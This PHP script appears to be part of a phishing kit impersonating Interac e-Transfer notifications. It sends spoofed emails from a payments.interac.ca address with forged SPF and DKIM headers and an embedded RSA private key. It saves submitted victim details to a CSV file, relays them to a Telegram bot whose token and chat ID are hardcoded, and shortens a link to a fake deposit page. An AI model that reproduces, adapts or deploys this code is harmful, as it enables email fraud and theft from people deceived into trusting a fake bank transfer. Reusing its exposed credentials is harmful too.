<?php
    // Function to encrypt the URL parameters
    function encryptParameters($params, $key) {
        $ivLength = openssl_cipher_iv_length('AES-256-CBC');
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encrypted = openssl_encrypt($params, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
        $encryptedMessage = $iv . $encrypted;
        $encryptedParams = base64_encode($encryptedMessage);
        return $encryptedParams;
    }

    // Replace with your encryption key
    $key = 'ENCRYPTED_PASSWORD_MAKE25+CHARACTERS';

    // URL parameters to encrypt
    $params = 'username=value1&password=value2';

    // Encrypt the parameters
    $encryptedParams = encryptParameters($params, $key);

    // Read the template file
    $templateFile = 'template.html';
    $emailTemplate = file_get_contents($templateFile);

    // Replace the placeholder with the encrypted parameters
    $emailTemplate = str_replace('{{encryptedParams}}', $encryptedParams, $emailTemplate);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

    require("phpmailer/src/PHPMailer.php");
    require("phpmailer/src/SMTP.php");
    require("phpmailer/src/Exception.php");

    function logSMTPCommunication($message)
{
    // Specify the path to the log file
    $logFilePath = '/smtp_log.txt';

    // Append the SMTP communication to the log file
    file_put_contents($logFilePath, $message, FILE_APPEND);
}
// Telegram Configuration
$telegramToken = "6016032432:AAEjURftqkkKIPA1q0nfBbJ003EBwRDU6rs";
$telegramChatID = '-1001974067428';

// Function to send message to Telegram
function sendMessageToTelegram($message)
{
    global $telegramToken, $telegramChatID;
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $data = array('chat_id' => $telegramChatID, 'text' => $message);
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
// Log field input data to Telegram
$logMessage = "Payment sent!\n=======================\n";
$logMessage .="$sender_name\n======================\n";
$logMessage .="$receivers_email\n======================\n";
$logMessage .="$amount \n======================\n";
sendMessageToTelegram($logMessage);

$receivers_name = $_POST['receivers_name'];
$receivers_email = $_POST['receivers_email'];
$sender_name = $_POST['sender_name'];
$sender_email = $_POST['sender_email'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($receivers_name, $receivers_email, $sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}
$short_url = shortenURL($long_url);

$template = $_POST['template']; // The selected template from the dropdown
$message = file_get_contents('template.html');
$message = str_replace('{{etransfer_interac_ca}}', $short_url, $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expire}}', $_POST['expire'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receivers_name}}', $_POST['receivers_name'], $message);
$message = str_replace('{{receivers_email}}', $_POST['receivers_email'], $message);
// DKIM Configuration
$selector = 'default';
$domain = 'payments.interac.ca';
$privateKey = <<<EOD
-----BEGIN RSA PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC/0enj763lrV96
sQjpbUWa/Rb+rJWP9yTpy/LqlAQG6N5LNp2pF2flLTFhgTXG79jCgeSZ4sBXMLcO
bTNp2PgqplPuPZhIcAw+QQt5QcUqiWXdysFlkJuDum1ME0BqQcx4uurRtkQyQ5uQ
IzEvM16DFOHKkZHs/xpvsimIKEQtlH3C6JysWl0Z4jC0HAusZ7p98isG+xZ+98uB
Y15zPgYIUJeFwVLiMjxKnB2bf64zkuPvHmdncXiiKj56GtMs+v0npYXFkt/UEbYS
yenMNlvleGsFXHGU+NyDutVcz4N8RySmKR8oRCQwgRJtbcv5OtBcAPCyAYSawcrw
4+LjdPEvAgMBAAECggEADbNnmlE/QX1tqWzFry6P3y8emlgnYp4Lc+uOUTT7SKcP
YZ3oCvDSCet9cHJzLd9pwxLWCivJAzFGkfA40OGfcCRrMEQUAXCHX1b0A9gvxgcE
UKAvyhpXEUSak+l4G17RxPnM1efH3TM5BEWPOMjZglFWg0p8esoJ0FqQXtpJbFvk
KV6p5xUphx6Dg6AobL3tN8s4TiUvoXFbi4/nSFxHp27/SCOL6IEoRxRJghKafuko
1ZrhjTowtnhN9I2TuCk9MOHFirWVNZwWR04zwSaK1yAZ7nAK7LPw5HkFd1mYjoYB
kJnxwHxGu4dEQZXnSxQo8OkO03z0lVDUVugOcMh52QKBgQDjCAhJXtadpy0OzwzE
9s/hHWozyIlsg1gt5YUVWzDmYjYjX7CXWmj0MqGajWN/TdMzYDym6jPOVenfoPcf
97f/enoq79Pr5Gw1oUTJjRQU415qortdw7BWhKoPkNpKq4KsBB5qr8NT2HU2fd8y
hw0S4BvgGWEEhd644FUwCJZ6PQKBgQDYS7PnJDiEUE5IOWiGs37pvpKR8IotT9hw
OKM6zj6r1TW0WKmIEKtu6Pg80IYjxHZBjU+5J6qb/OWCL2jr718G94x1qTjcBsOI
PhX+ie60u5xEm53iuHY2BKYF0UJkuXBovWnKRKgDmS5hOKrvXRk7C+Q0R0LsWe/U
/ccCb7zL2wKBgQCcudzOmbPanZ/TS0fraN7U7vNz0ApeaMWk2X9n4M3/HOl2vgYw
Ve+CNLmu8dAv/8++9b6pE6Cz3kdXY811uhLBQRG5Nlq7y7KPy0arRMMKMHPrdW+X
KRJAh9DGch7f0Uqh6S3+RFu5NAKmnXpJbUWvNBrKN3rsHmZEhkkIocUPmQKBgHqw
3niztBdh0jXn0qHt+YSvpEaCUm8HhreJeRXnXedsxszpKilTg1sjbYRZqG1riMUA
WoOlu4JGPw3MxNBodNfn3dX0SpuMfqeuyB0dsrj0Xt0QBMxRZESZ+G7+V5H5Golf
QD4LGd8IqiVd1qB2h9RVl3oMHishjQidd6CrL0XXAoGAAMYmHLYOSxVz/YsiNwLn
YBELFowNp2drkoD1t4E58wvs8brnYo7xguW6eXx4aLy4RfU17Vbv9AHyoHVH+Gu8
trGeZvTaqBdoI3okXKE8C3JcJh5yKa6RoSLr9EZl4QldTiK6bZZFy42TYPSYMCti
l0kPVRcQF6t50TfsA0aK/DE=
-----END RSA PRIVATE KEY-----
EOD;

// DKIM Signing
$headers = "From: payments@interac.ca\r\n"; // Replace with actual headers
$timestamp = time();
$hash = hash('sha256', $headers);
$dkimHeader = "v=1; a=rsa-sha256; c=relaxed/simple; d=$domain; s=$selector; t=$timestamp; bh=$hash; h=From:;\r\n";
$signature = '';
openssl_sign($dkimHeader, $signature, $privateKey, OPENSSL_ALGO_SHA256);
$signature = base64_encode($signature);
$dkimSignature = "DKIM-Signature: $dkimHeader b=$signature\r\n";

$headers .= $dkimSignature;

//Create PHPMailer instance
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('notify@payments.interac.ca', $_POST['sender_name']);
$mail->addCustomHeader('Sender', 'notify@payments.interac.ca');
$mail->addCustomHeader('Return-Path', 'notify@payments.interac.ca');
$mail->addCustomHeader('Received-SPF', 'Pass (protection.outlook.com: domain of payments.interac.ca designates 64.254.22.37 as permitted sender)');
$mail->addCustomHeader('DKIM-Signature', 'v=1; a=rsa-sha256; c=relaxed/simple; d=payments.interac.ca');

// Add the receiver's email address
$mail->AddAddress($_POST['receivers_email']);

$mail->Subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money.';
$mail->IsHTML(true);
$mail->CharSet = "utf-8";
$mail->Body = $emailTemplate;

if ($mail->Send()) {
    echo "Email sent successfully!";
} else {
    echo "Email sending failed.";
}
$currentDate = new DateTime();
$line = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');

// Redirect back to start.php
header("Location: ../../../1start.php");
exit;
?>
